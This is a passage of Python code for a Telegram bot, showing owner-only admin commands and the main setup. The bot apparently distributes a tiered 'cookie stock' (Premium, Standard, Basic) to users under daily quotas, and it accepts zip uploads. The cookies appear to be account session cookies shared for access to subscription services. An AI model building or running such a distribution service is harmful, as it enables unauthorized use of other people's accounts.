        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ Saved     : <b>{saved}</b>\n"
        f"⏭️ Skipped   : <b>{skipped}</b>\n"
        f"❌ Failed    : <b>{failed}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📦 <b>Stock Now:</b>\n"
        f"   💎 Premium: <b>{stock['Premium']}</b>\n"
        f"   ⭐ Standard: <b>{stock['Standard']}</b>\n"
        f"   🔹 Basic: <b>{stock['Basic']}</b>\n"
        f"   📁 Total: <b>{total_now}</b>"
    )

    if errors:
        preview = "\n".join(f"  • <code>{e}</code>" for e in errors[:5])
        text += f"\n\n⚠️ <b>Errors (first 5):</b>\n{preview}"
        if len(errors) > 5:
            text += f"\n  <i>... and {len(errors) - 5} more</i>"

    await msg.edit_text(text, parse_mode=ParseMode.HTML)


@owner_only
async def reload_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stock = get_stock_by_plan()
    total = sum(stock.values())
    await update.message.reply_text(
        f"📦 <b>Cookie Stock</b>\n\n"
        f"   💎 Premium: <b>{stock['Premium']}</b>\n"
        f"   ⭐ Standard: <b>{stock['Standard']}</b>\n"
        f"   🔹 Basic: <b>{stock['Basic']}</b>\n"
        f"   📁 Total: <b>{total}</b>",
        parse_mode=ParseMode.HTML,
    )


@owner_only
async def reset_me_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    reset_user_quota(user.id)
    await update.message.reply_text("✅ Your quota has been reset.")


@owner_only
async def reset_user_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /reset <user_id>")
        return
    try:
        uid = int(context.args[0])
    except ValueError:
        await update.message.reply_text("user_id must be a number.")
        return
    reset_user_quota(uid)
    await update.message.reply_text(
        f"✅ Quota for user <code>{uid}</code> has been reset.",
        parse_mode=ParseMode.HTML,
    )


@owner_only
async def reset_all_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    reset_all_quota()
    await update.message.reply_text("✅ All quotas have been reset.")


@owner_only
async def broadcast_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /broadcast <message>")
        return
    message = " ".join(context.args)
    data = load_usage()
    user_ids = list(data.keys())

    sent, failed = 0, 0
    for uid in user_ids:
        try:
            await context.bot.send_message(chat_id=int(uid), text=message)
            sent += 1
        except Exception:
            failed += 1

    await update.message.reply_text(
        f"📢 Broadcast complete.\n✅ Sent: {sent}\n❌ Failed: {failed}"
    )


@owner_only
async def admin_stats_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    s = get_global_stats()
    stock = get_stock_by_plan()
    prem = load_premium()
    data = load_usage()
    today = _today_str()

    today_entries = [
        (uid, v.get("count", 0)) for uid, v in data.items() if v.get("date") == today
    ]
    today_entries.sort(key=lambda x: x[1], reverse=True)
    top5 = today_entries[:5]

    top5_text = "\n".join(
        f"  • <code>{mask_id(uid)}</code> — {count} req" for uid, count in top5
    ) or "  • (none)"

    text = (
        f"👑 <b>Admin Stats</b>\n\n"
        f"👥 Total users: <b>{s['total_users']}</b>\n"
        f"🟢 Active today: <b>{s['today_users']}</b>\n"
        f"🎯 Requests today: <b>{s['today_requests']}</b>\n\n"
        f"📦 <b>Stock:</b>\n"
        f"   💎 Premium: <b>{stock['Premium']}</b>\n"
        f"   ⭐ Standard: <b>{stock['Standard']}</b>\n"
        f"   🔹 Basic: <b>{stock['Basic']}</b>\n"
        f"   📁 Total: <b>{sum(stock.values())}</b>\n\n"
        f"💎 Premium users: <b>{len(prem)}</b>\n"
        f"👑 Owners: <b>{len(OWNER_IDS)}</b>\n\n"
        f"🔥 <b>Top 5 today:</b>\n{top5_text}"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)


@owner_only
async def add_premium_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /addpremium <user_id>")
        return
    try:
        uid = int(context.args[0])
    except ValueError:
        await update.message.reply_text("user_id must be a number.")
        return

    add_premium(uid)
    await update.message.reply_text(
        f"💎 User <code>{uid}</code> is now <b>Premium</b>!\n"
        f"Quota: unlimited (∞)",
        parse_mode=ParseMode.HTML,
    )

    try:
        await context.bot.send_message(
            chat_id=uid,
            text=(
                f"🎉 <b>Congratulations!</b>\n\n"
                f"You are now a <b>Premium user</b> 💎\n"
                f"Your quota is <b>unlimited</b> (∞).\n\n"
                f"Use /get as much as you want!"
            ),
            parse_mode=ParseMode.HTML,
        )
    except Exception:
        pass


@owner_only
async def del_premium_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /delpremium <user_id>")
        return
    try:
        uid = int(context.args[0])
    except ValueError:
        await update.message.reply_text("user_id must be a number.")
        return

    remove_premium(uid)
    await update.message.reply_text(
        f"✅ Premium removed for user <code>{uid}</code>.\n"
        f"Quota back to {DAILY_LIMIT}/day.",
        parse_mode=ParseMode.HTML,
    )


@owner_only
async def list_premium_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    prem = load_premium()
    if not prem:
        await update.message.reply_text("No premium users at the moment.")
        return

    lines = "\n".join(f"  • <code>{uid}</code>" for uid in sorted(prem))
    await update.message.reply_text(
        f"💎 <b>Premium List ({len(prem)})</b>\n\n{lines}",
        parse_mode=ParseMode.HTML,
    )


# ==================== MAIN ====================
def main():
    log("Bot starting — running cookie cleanup...")
    cleanup_non_premium_files()

    stock = get_stock_by_plan()
    log(f"[STOCK] Premium={stock['Premium']} Standard={stock['Standard']} Basic={stock['Basic']}")

    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("get", get_cmd))
    app.add_handler(CommandHandler("quota", quota_cmd))
    app.add_handler(CommandHandler("stats", stats_cmd))
    app.add_handler(CommandHandler("premium", premium_info_cmd))

    app.add_handler(CommandHandler("upload", upload_cmd))
    app.add_handler(CommandHandler("cancel_upload", cancel_upload_cmd))
    app.add_handler(
        MessageHandler(filters.Document.FileExtension("zip"), document_handler)
    )

    app.add_handler(CommandHandler("reload", reload_cmd))
    app.add_handler(CommandHandler("reset_me", reset_me_cmd))
    app.add_handler(CommandHandler("reset", reset_user_cmd))
    app.add_handler(CommandHandler("reset_all", reset_all_cmd))
    app.add_handler(CommandHandler("broadcast", broadcast_cmd))
    app.add_handler(CommandHandler("admin_stats", admin_stats_cmd))
    app.add_handler(CommandHandler("addpremium", add_premium_cmd))
    app.add_handler(CommandHandler("delpremium", del_premium_cmd))
    app.add_handler(CommandHandler("listpremium", list_premium_cmd))

    app.add_handler(CallbackQueryHandler(menu_callback))

    log("Bot running...")
    print("Bot running... Press Ctrl+C to stop.")
    app.run_polling()


if __name__ == "__main__":
    main()